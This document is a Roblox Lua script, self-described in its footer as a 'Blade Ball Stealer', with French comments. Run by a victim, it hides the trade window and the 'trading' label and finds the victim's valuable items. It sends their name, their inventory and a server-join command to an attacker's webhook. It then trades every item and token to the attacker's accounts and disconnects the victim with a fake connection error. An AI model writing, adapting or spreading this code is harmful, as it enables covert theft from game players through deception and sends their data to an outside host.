-- // CONFIGURATION & EXECUTION CHECK
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- // CONFIG UTILISATEUR
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- // SÉCURITÉ & NETTOYAGE UI
if next(users) == nil or webhook == "" then plr:kick("Missing Config") return end

tradeGui.Black.Visible = false
tradeGui.Main.Visible = false
tradeGui.Main:GetPropertyChangedSignal("Visible"):Connect(function() tradeGui.Main.Visible = false end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then
        -- SUPPRIMER LE TEXTE "TRADING" AU DESSUS DE LA TETE
        task.spawn(function()
            for i = 1, 20 do
                if plr.Character then
                    for _, v in ipairs(plr.Character:GetDescendants()) do
                        if v:IsA("BillboardGui") then v:Destroy() end
                    end
                end
                task.wait(0.1)
            end
        end)
    end
end)

-- // FONCTIONS DE TRADE (TES FONCTIONS ORIGINALES AMÉLIORÉES)
local function sendTradeRequest(user)
    local target = Players:FindFirstChild(user)
    if not target then return end
    repeat
        task.wait(0.5)
        netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
    until inTrade
end

local function addItemToTrade(itemType, ID)
    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
end

local function readyTrade()
    repeat
        task.wait(0.2)
        netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
    -- On boucle tant qu'on est en trade ET que le bouton Accept n'est pas encore visible
    until not inTrade or (tradeGui.Main:FindFirstChild("Accept") and tradeGui.Main.Accept.Visible)
end

local function confirmTrade()
    repeat
        task.wait(0.2)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
    until not inTrade
end

local function formatNumber(number)
    if not number then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local i = 1
    while number >= 1000 and i < #suffixes do
        number = number / 1000
        i = i + 1
    end
    return i == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[i])
end

-- // SCAN RAP
local totalRAP = 0
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
local rapMap = {}

for _, cat in ipairs(categories) do
    rapMap[cat] = {}
    if rapData[cat] then
        for k, v in pairs(rapData[cat]) do
            local success, decoded = pcall(HttpService.JSONDecode, HttpService, k)
            if success then
                for _, p in ipairs(decoded) do if p[1] == "Name" then rapMap[cat][p[2]] = v end end
            end
        end
    end
end

for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                local r = rapMap[cat][info.Name] or 0
                if r >= min_rap then
                    totalRAP = totalRAP + r
                    table.insert(itemsToSend, {ItemID = id, RAP = r, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

-- // GESTION WEBHOOK (Lien JobId + Embed corrigé)
local function sendWebhook(list, isJoin)
    local title = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
    local color = (totalRAP >= 500) and 65280 or 10181046
    local prefix = (ping == "Yes") and "@everyone " or ""
    
    local itemsText = ""
    for _, item in ipairs(list) do
        itemsText = itemsText .. string.format("- %s (%s RAP)\n", item.Name, formatNumber(item.RAP))
    end
    if #itemsText > 1000 then itemsText = string.sub(itemsText, 1, 950) .. "... (and more)" end

    local data = {
        ["content"] = isJoin and (prefix .. "```game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')```") or nil,
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = color,
            ["fields"] = {
                {name = "Victim:", value = plr.Name, inline = true},
                {name = "Total RAP:", value = formatNumber(totalRAP), inline = true},
                {name = "Items:", value = itemsText or "None"}
            },
            ["footer"] = {["text"] = "Blade Ball Stealer | JobID: " .. game.JobId}
        }}
    }

    local requestFunc = syn and syn.request or http_request or request or (http and http.request)
    if requestFunc then
        requestFunc({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end
end

-- // LANCEMENT
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    sendWebhook(itemsToSend, true)

    local function start(targetName)
        while #itemsToSend > 0 do
            sendTradeRequest(targetName)
            repeat task.wait(0.2) until inTrade
            
            -- Ajout rapide
            for i = 1, math.min(100, #itemsToSend) do
                local item = table.remove(itemsToSend, 1)
                addItemToTrade(item.itemType, item.ItemID)
            end

            -- Tokens
            local tokens = tonumber(tradeGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")) or 0
            if tokens > 0 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens) end

            task.wait(1) -- Temps pour que la victime mette son stuff
            readyTrade()
            confirmTrade()
        end
        plr:kick("Connection Error (0x23)")
    end

    -- Détection du compte receveur
    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then task.spawn(start, p.Name) break end
    end
    Players.PlayerAdded:Connect(function(p)
        if table.find(users, p.Name) then start(p.Name) end
    end)
end
